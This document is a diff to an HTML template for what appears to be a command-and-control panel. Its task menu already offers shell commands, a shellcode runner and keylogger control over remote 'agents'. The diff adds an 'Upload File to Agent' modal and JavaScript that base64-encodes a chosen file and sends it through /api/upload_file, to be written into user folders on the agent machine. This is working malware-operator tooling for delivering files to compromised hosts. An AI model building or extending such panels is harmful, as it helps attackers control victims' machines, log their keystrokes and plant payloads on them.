@@ -120,6 +120,7 @@
                             <option value="shellcode">Shellcode-Runner</option>
                             <option value="keylogger_start">Start Keylogger</option>
                             <option value="keylogger_stop">Stop Keylogger</option>
+                            <option value="upload_file">Upload File</option>
                         </select>
                         <button id="executeTask" class="btn btn-sm btn-primary me-3">Execute</button>
                         <span id="keyloggerStatusBadge" class="badge bg-secondary">Keylogger Status: Unknown</span>
@@ -329,6 +330,38 @@
         </div>
     </div>
 </div>
+
+<!-- Upload File Modal -->
+<div class="modal fade" id="uploadFileModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Upload File to Agent</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="mb-3">
+                    <label for="uploadFileInput" class="form-label">Select File</label>
+                    <input class="form-control" type="file" id="uploadFileInput" required>
+                </div>
+                <div class="mb-3">
+                    <label for="uploadDestinationFolder" class="form-label">Destination Folder</label>
+                    <input type="text" class="form-control" id="uploadDestinationFolder" placeholder="e.g., C:\Users\Public or %USERPROFILE%\Documents" value="%USERPROFILE%\Downloads">
+                    <small class="text-muted">Full path where the file should be saved on the agent</small>
+                </div>
+                <div class="mb-3">
+                    <label for="uploadFileName" class="form-label">File Name (optional)</label>
+                    <input type="text" class="form-control" id="uploadFileName" placeholder="Leave empty to use original filename">
+                    <small class="text-muted">If empty, the original filename will be used</small>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" id="uploadFileBtn">Upload</button>
+            </div>
+        </div>
+    </div>
+</div>
 {% endblock %}
 
 {% block extra_css %}
@@ -492,6 +525,13 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
+            // Handle upload_file task - show the upload modal
+            if (taskType === 'upload_file') {
+                const uploadModal = new bootstrap.Modal(document.getElementById('uploadFileModal'));
+                uploadModal.show();
+                return;
+            }
+
             let taskData = {};
             if (taskType === 'shell') {
                 const command = prompt('Enter command to execute:');
@@ -611,6 +651,70 @@ document.addEventListener('DOMContentLoaded', function() {
         showToast('Error', 'Failed to process shellcode: ' + error.message, 'danger');
     }
 });
+
+    // Upload file handler
+    document.getElementById('uploadFileBtn').addEventListener('click', async function() {
+        const fileInput = document.getElementById('uploadFileInput');
+        const destinationFolder = document.getElementById('uploadDestinationFolder').value.trim();
+        const fileName = document.getElementById('uploadFileName').value.trim();
+        const agentId = "{{ agent.id }}";
+        
+        try {
+            if (!fileInput.files.length) {
+                throw new Error('Please select a file');
+            }
+            
+            if (!destinationFolder) {
+                throw new Error('Please specify a destination folder');
+            }
+            
+            const file = fileInput.files[0];
+            const finalFileName = fileName || file.name;
+            
+            // Read file as base64
+            const reader = new FileReader();
+            reader.onload = async function() {
+                try {
+                    const base64Data = reader.result.split(',')[1]; // Remove data URL prefix
+                    
+                    const response = await fetch('/api/upload_file', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            agent_id: agentId,
+                            filename: finalFileName,
+                            folder: destinationFolder,
+                            data: base64Data,
+                            size: file.size
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (!response.ok) {
+                        throw new Error(data.message || 'Failed to create upload task');
+                    }
+                    
+                    showToast('Success', 'File upload task created! Task ID: ' + data.task_id + ' - ' + finalFileName + ' to ' + destinationFolder, 'success');
+                    bootstrap.Modal.getInstance(document.getElementById('uploadFileModal')).hide();
+                    window.location.reload();
+                } catch (error) {
+                    console.error('Error:', error);
+                    showToast('Error', 'Failed to upload file: ' + error.message, 'danger');
+                }
+            };
+            reader.onerror = function() {
+                throw new Error('Failed to read file');
+            };
+            reader.readAsDataURL(file);
+        } catch (error) {
+            console.error('Error:', error);
+            showToast('Error', 'Failed to upload file: ' + error.message, 'danger');
+        }
+    });
 
     // Helper function to read file as ArrayBuffer
     function readFileAsArrayBuffer(file) {
